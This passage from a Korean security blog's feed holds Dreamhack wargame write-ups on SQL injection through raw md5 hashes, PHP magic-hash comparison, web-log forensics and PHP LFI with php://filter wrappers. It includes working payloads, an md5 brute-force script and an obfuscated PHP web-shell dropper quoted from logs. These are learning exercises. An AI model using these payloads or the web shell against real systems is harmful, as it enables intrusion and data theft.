  <li><a href="https://askubuntu.com/questions/1437128/docker-service-wont-start-on-ubuntu-22-04-on-wsl2">Docker service won’t start on Ubuntu 22.04 on WSL2 - Ask Ubuntu</a></li>
  <li><a href="https://askubuntu.com/questions/1437128/docker-service-wont-start-on-ubuntu-22-04-on-wsl2">Docker service won’t start on Ubuntu 22.04 on WSL2 - Ask Ubuntu</a></li>
  <li><a href="https://www.lainyzine.com/ko/article/how-to-start-shutdown-reboot-wsl-linux/">WSL 리눅스 시작/종료/재부팅 방법 (lainyzine.com)</a></li>
  <li><a href="https://seong6496.tistory.com/316">우분투 버전 간단한 확인방법 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Ubuntu" /><category term="docker" /><summary type="html"><![CDATA[Docker 패키지를 이용하여 설치하여 보자.]]></summary></entry><entry><title type="html">PHP md5 (SQL Injection)</title><link href="http://localhost:4000/dreamhack/SQLiPHPmd5/" rel="alternate" type="text/html" title="PHP md5 (SQL Injection)" /><published>2023-09-12T00:00:00+09:00</published><updated>2023-09-12T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/SQLiPHPmd5</id><content type="html" xml:base="http://localhost:4000/dreamhack/SQLiPHPmd5/"><![CDATA[<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/337">wargame.kr md5 password 워게임 Dreamhack</a></li>
</ul>

<h2 id="php-md5">PHP md5</h2>
<ul>
  <li>md5 해시화를 이용하여 sql injection 공격을 시도할 수 있다.</li>
</ul>

<h3 id="분석">분석</h3>
<ul>
  <li>php 의 md5 기능을 이용하여 사용자의 입력을 해시화 한다.</li>
  <li>해시화 한 값을 이용하여 password 와 비교한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span><span class="err"> </span><span class="o">*</span><span class="err"> </span><span class="k">from</span><span class="err"> </span><span class="n">admin_password</span><span class="err"> </span><span class="k">where</span><span class="err"> </span><span class="n">password</span><span class="o">=</span><span class="s1">'".md5($ps,true)."'</span>
</code></pre></div></div>

<ul>
  <li>md5(입력,true) : 16자리의 바이너리를 반환한다.</li>
  <li>md5(입력,flase) : 32 문자열 16진수를 반환한다.</li>
</ul>

<h3 id="공격">공격</h3>

<h4 id="방법-1--or">방법 1 : or</h4>
<ul>
  <li>or 을 이용하여 password 인증을 우회해보자.</li>
  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'or'</code> 이 존재하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true)= aaa'or'bbb

select * from admin_password where password='aaa'or'bbb'
</code></pre></div></div>

<ul>
  <li>
    <p>or 앞 부분이 False 여도 뒷 부분이 true 이기 때문에 비밀번호 인증 우회가 가능하다.</p>
  </li>
  <li>
    <p>sql injection 공격 payload.</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>129581926211651571912466741651878684928

md5 = �T0D��o#��'or'8
</code></pre></div></div>

<h4 id="방법-2--">방법 2 : =</h4>
<ul>
  <li>= 을 이용하여 password 인증을 우회해보자.</li>
  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'='문자</code> 이 존재하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true) = asdfaskd'='asdf

select * from admin_password where password='asdfaskd'='asdf'
</code></pre></div></div>

<ul>
  <li>원리</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>where password='asdfaskd'='asdf'

는 먼저 앞 부분을 비교한다.

where (password='asdfaskd')='asdf'

where false='asdf' 

여기서 mysql false 의 타입은 tinyint 이고 값은 0 이다.
'asdf' 타입을 SIGNED 즉 int 형으로 바꿔서 비교를 진행한다.

따라서 비교하는 값은 다음과 같다.

where 0=0
</code></pre></div></div>

<ul>
  <li>직접 확인하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'123'</span><span class="p">;</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'aaaa'</span><span class="p">;</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre></div></div>

<ul>
  <li>여기서 주의해야 할 점이 있는데 <code class="language-plaintext highlighter-rouge">'123adfsf'</code> 와 같은 형태를 int 형으로 타입 변환하면 123 으로 변환되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">cast</span><span class="p">(</span><span class="s1">'123asdf'</span> <span class="k">as</span> <span class="nb">SIGNED</span><span class="p">);</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">123</span>
</code></pre></div></div>

<ul>
  <li>sql injection 공격 payload.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>98750788
md5 = n�A�nI�^���h'='

하지만 다음 값은 실패한다.
38106544
md5 = &amp;�p'='63@-��

왜냐하면
1. select * from admin_password where password='&amp;�p'='63@-��'
2. select * from admin_password where false='63@-��'
3. select * from admin_password where false=63
4. select * from admin_password where 0=63

0과 63을 비교하는 형태가 되기 때문이다.
</code></pre></div></div>

<h3 id="평문-값-찾기">평문 값 찾기</h3>
<ul>
  <li>python 을 이용하여 <code class="language-plaintext highlighter-rouge">'='</code> 값이 들어가는 평문 값을 쉽게 찾아줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>

<span class="n">key1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"'='"</span>
<span class="n">key2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"'or'"</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100_000_000</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="nf">md5</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="n">key1</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">key1</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">elif</span> <span class="n">key2</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">key2</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://heavening.tistory.com/85">int의 종류 및 크기 tinyint, smallint, int, bigint 초간단 정리 (tistory.com)</a></li>
  <li><a href="https://www.php.net/manual/en/function.md5.php">PHP: md5 - Manual</a></li>
  <li><a href="https://onecompiler.com/mysql">mysql 온라인 컴파일러</a></li>
  <li><a href="https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">SQL injection with raw MD5 hashes (Leet More CTF 2010 injection 300) - Christian von Kleist (posthaven.com)</a></li>
  <li><a href="https://github.com/seunghunoh57/SQL-Injection">seunghunoh57/SQL-Injection: This program will generate a password that bypasses a PHP script using raw md5 encryption for its password. (github.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="md5" /><category term="sqli" /><summary type="html"><![CDATA[php 의 md5 기능을 우회하여 sql injection 공격을 시도해보자.]]></summary></entry><entry><title type="html">PHP 비교연산자</title><link href="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/" rel="alternate" type="text/html" title="PHP 비교연산자" /><published>2023-09-11T00:00:00+09:00</published><updated>2023-09-11T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90</id><content type="html" xml:base="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/"><![CDATA[<ul>
  <li>php 에 존재하는 취약점이다!</li>
</ul>

<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/338">jff3_magic 워게임 Dreamhack</a></li>
</ul>

<h2 id="php-비교-연산자">PHP 비교 연산자</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">==</code> : 자료형에 상관없이 값만 비교한다.</li>
  <li><code class="language-plaintext highlighter-rouge">===</code> : 자료형 및 값을 비교한다.</li>
</ul>

<h3 id="취약점">취약점</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">==</code> 이용하여 값을 비교할 때 값 만을 비교하여 발생할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">'0e2'</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$a</span><span class="o">==</span><span class="s1">'0'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="n">e123</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$a</span><span class="o">==</span><span class="s1">'0'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<h3 id="magic-hash">Magic Hash</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">0e1234</code> 문자열을 이용하여 비교를 하면 php 에서는 float 형식으로 인식하게 된다.</li>
  <li>즉 0e 로 시작하고 뒤에 모두 숫자가 오는 문자열을 이용하여 비교를 하면 float 형식으로 인식하게된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0e2 == 0*10^2 == 0
즉 0을 비교하는 것이랑 같은 효과를 발생한다.
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://t-okk.tistory.com/27">HackCTF Web 마법봉 (매직해시 취약점) (tistory.com)</a></li>
  <li><a href="http://php.adamharvey.name/manual/kr/types.comparisons.php">PHP: PHP 자료형 비교표 - Manual (adamharvey.name)</a></li>
  <li><a href="https://comsec.tistory.com/86">HackCTF  Hash  :: 보안 한 걸음 (tistory.com)</a></li>
  <li><a href="https://acloit.tistory.com/entry/%EB%A7%A4%EC%A7%81%ED%95%B4%EC%8B%9C">매직해시 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="비교연산자" /><summary type="html"><![CDATA[PHP 비교연산자 취약점에 대하여 알아보자.]]></summary></entry><entry><title type="html">[wargame.kr] weblog-1 문제</title><link href="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/" rel="alternate" type="text/html" title="[wargame.kr] weblog-1 문제" /><published>2023-09-10T00:00:00+09:00</published><updated>2023-09-10T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0</id><content type="html" xml:base="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/"><![CDATA[<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/71">weblog-1 문제</a></li>
</ul>

<h2 id="level-0">LEVEL 0</h2>
<ul>
  <li>log 의 기록을 보고 admin 계정을 비밀번호를 찾아주면 된다.</li>
  <li>로그 분석 결과 500 에러(서버 에러)가 발생할 때 나오는 비교 정수 값을 char 로 변환해주면 된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">'./file/access.log'</span><span class="p">)</span>
<span class="n">keyword</span> <span class="o">=</span> <span class="s">'HTTP/1.1" 500'</span>
<span class="n">keyword2</span> <span class="o">=</span> <span class="s">'))='</span>

<span class="n">arr</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="s">'end'</span><span class="p">)</span>
        <span class="k">break</span>
    
    <span class="k">if</span> <span class="n">keyword</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
        <span class="k">continue</span>

    <span class="n">a</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">keyword2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">continue</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">a</span><span class="o">+</span><span class="nf">len</span><span class="p">(</span><span class="n">keyword2</span><span class="p">):]</span>

    <span class="n">l</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="s">','</span><span class="p">)</span>

    <span class="n">arr</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[:</span><span class="n">l</span><span class="p">])))</span>
    <span class="c1"># print(line[:l])
</span>    
<span class="nf">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">arr</span><span class="p">))</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="level-1">LEVEL 1</h2>
<ul>
  <li>config.php 파일을 추출해야 한다.</li>
  <li>include 를 이용하여 파일을 추출하는 것을 확인할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/admin/?page=php://filter/convert.base64-encode/resource=../config.php
</code></pre></div></div>

<h2 id="level-2">LEVEL 2</h2>
<ul>
  <li>
    <p>LFI(Local File Include) 취약점을 이용하여 서버의 php 코드를 실행하는 것을 확인할 수 있다.</p>
  </li>
  <li>
    <p>악성 php 코드 저장</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&amp;memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>

<ul>
  <li>코드를 살펴본 결과 memo.php 에서 memo 파라미터로 들어오는 값을 session 에 저장하는 것을 확인할 수 있다.</li>
  <li>session에 저장된 값을 불러오기 위해서 include 기능을 이용한 것을 확인할 수 있다.</li>
  <li>악성 코드가 서버에서 실행된다!</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>

<h2 id="level-3">LEVEL 3</h2>
<ul>
  <li>웹 쉘 코드가 저장된 위치를 알아내야 한다.</li>
  <li>level2 에서 실행시킨 코드이다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="k">function</span> <span class="n">m</span><span class="p">(</span><span class="nv">$l</span><span class="p">,</span><span class="nv">$T</span><span class="o">=</span><span class="mi">0</span><span class="p">){</span>
	<span class="nv">$K</span><span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d'</span><span class="p">);</span>
	<span class="nv">$_</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$l</span><span class="p">);</span>
	<span class="nv">$__</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$K</span><span class="p">);</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
		<span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nv">$__</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
			<span class="k">if</span><span class="p">(</span><span class="nv">$T</span><span class="p">){</span>
				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">^</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nv">$l</span><span class="p">;</span>
<span class="p">}</span> 
<span class="nf">m</span><span class="p">(</span><span class="s1">'bmha[tqp[gkjpajpw'</span><span class="p">)(</span><span class="nf">m</span><span class="p">(</span><span class="s1">'+rev+sss+lpih+qthke`w+miecaw*tlt'</span><span class="p">),</span><span class="nf">m</span><span class="p">(</span><span class="s1">'8;tlt$lae`av,&amp;LPPT+5*5$040$Jkp$Bkqj`&amp;-?w}wpai, [CAP_&amp;g&amp;Y-?'</span><span class="p">));</span> 
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>난독화 되어있는 것을 확인할 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">date('Y-m-d')</code> 를 02/Jun/2020 즉 <code class="language-plaintext highlighter-rouge">2020-06-02</code> 로 바꾼 다음 php 로 실행시켜 주면 어떻게 웹 쉘 코드를 업로드 하였는지 출력되는 것을 확인할 수 있다.</li>
</ul>

<h2 id="level-4">LEVEL 4</h2>
<ul>
  <li>처음으로 실행된 명령어는 로그를 보면 바로 알 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:56:32 +0000] "GET /uploads/images.php?c=whoami HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="access.log" /><summary type="html"><![CDATA[weblog-1 문제 풀이]]></summary></entry><entry><title type="html">[wargame.kr] PHP LFI 문제</title><link href="http://localhost:4000/dreamhack/php_LFI_vuln/" rel="alternate" type="text/html" title="[wargame.kr] PHP LFI 문제" /><published>2023-08-29T00:00:00+09:00</published><updated>2023-08-29T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_LFI_vuln</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_LFI_vuln/"><![CDATA[<h2 id="lfi--php-wrapper">LFI + PHP Wrapper</h2>
<ul>
  <li>include 취약점과 wrapper 취약점을 이용하여 문제를 해결해 주어야 한다.</li>
</ul>

<h3 id="코드-분석">코드 분석</h3>
<ul>
  <li>include 부분에 취약점이 존재한다.</li>
  <li>요청 파라미터로 아무것도 받지 못하면 디펄트로 설정된 main.php 파일을 include 한다.</li>
  <li>get 요청 파라미터로 확장자를 뺀 이름을 넣어주면 <code class="language-plaintext highlighter-rouge">include 파일이름.php</code> 가 include 되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'.php'</span><span class="o">:</span><span class="s1">'main.php'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="php-프로토콜의-filter-기능을-이용한-공격-payload">php 프로토콜의 filter 기능을 이용한 공격 Payload</h3>
<ul>
  <li>
    <p>filter 기능을 이용하면 파일 내용을 먼저 필터링 처리한 다음 php 파일로서 실행이 된다.</p>
  </li>
  <li>방법 1.  <code class="language-plaintext highlighter-rouge">convert.base64-encode</code> 이용하기</li>
  <li>이렇게 하면 flag.php 파일 내용이 먼저 base64 로 인코딩을 한 다음 php 파일로서 실행이 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag
</code></pre></div></div>

<ul>
  <li>방법 2. <code class="language-plaintext highlighter-rouge">string.rot13</code></li>
  <li>이렇게 하면 flag.php 파일 내용이 먼저 rot13 로 인코딩을 한 다음 php 파일로서 실행이 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?page=php://filter/read=string.rot13/resource=/var/www/uploads/flag
</code></pre></div></div>

<ul>
  <li>인코딩된 데이터를 사용자는 받을 수 있기 때문에 파일 내용을 확인하기 위해서는 디코딩 작업을 해주면 된다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://www.php.net/manual/en/wrappers.php">php 프로토콜</a></li>
  <li><a href="https://www.php.net/manual/en/filters.php">php 에서 지원하는 필터</a></li>
  <li><a href="https://rot13.com/">rot13 디코더</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="include" /><category term="wrapper" /><summary type="html"><![CDATA[PHP LFI 문제 풀이]]></summary></entry></feed>